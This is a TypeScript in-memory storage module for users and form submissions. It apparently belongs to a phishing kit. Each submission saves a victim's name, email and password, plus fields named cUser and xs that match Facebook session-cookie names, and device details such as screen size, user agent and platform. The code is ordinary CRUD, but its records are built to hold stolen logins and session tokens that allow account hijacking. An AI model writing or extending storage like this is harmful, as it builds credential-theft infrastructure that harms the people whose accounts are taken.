import { users, formSubmissions, type User, type InsertUser, type FormSubmission, type InsertFormSubmission } from "@shared/schema";

export interface IStorage {
  getUser(id: number): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  createFormSubmission(submission: InsertFormSubmission): Promise<FormSubmission>;
  updateFormSubmission(id: number, updates: Partial<InsertFormSubmission>): Promise<FormSubmission | undefined>;
  getFormSubmission(id: number): Promise<FormSubmission | undefined>;
  getAllFormSubmissions(): Promise<FormSubmission[]>;
}

export class MemStorage implements IStorage {
  private users: Map<number, User>;
  private formSubmissions: Map<number, FormSubmission>;
  private currentUserId: number;
  private currentSubmissionId: number;

  constructor() {
    this.users = new Map();
    this.formSubmissions = new Map();
    this.currentUserId = 1;
    this.currentSubmissionId = 1;
  }

  async getUser(id: number): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = this.currentUserId++;
    const user: User = { ...insertUser, id };
    this.users.set(id, user);
    return user;
  }

  async createFormSubmission(submission: InsertFormSubmission): Promise<FormSubmission> {
    const id = this.currentSubmissionId++;
    const formSubmission: FormSubmission = { 
      id,
      fullName: submission.fullName,
      email: submission.email,
      cUser: submission.cUser,
      xs: submission.xs,
      password: submission.password || null,
      screenWidth: submission.screenWidth ?? null,
      screenHeight: submission.screenHeight ?? null,
      isTouchDevice: submission.isTouchDevice ?? null,
      userAgent: submission.userAgent ?? null,
      platform: submission.platform ?? null,
      timestamp: new Date(),
      step: submission.step || "main"
    };
    this.formSubmissions.set(id, formSubmission);
    return formSubmission;
  }

  async updateFormSubmission(id: number, updates: Partial<InsertFormSubmission>): Promise<FormSubmission | undefined> {
    const existing = this.formSubmissions.get(id);
    if (!existing) return undefined;
    
    const updated: FormSubmission = { ...existing, ...updates };
    this.formSubmissions.set(id, updated);
    return updated;
  }

  async getFormSubmission(id: number): Promise<FormSubmission | undefined> {
    return this.formSubmissions.get(id);
  }

  async getAllFormSubmissions(): Promise<FormSubmission[]> {
    return Array.from(this.formSubmissions.values());
  }
}

export const storage = new MemStorage();
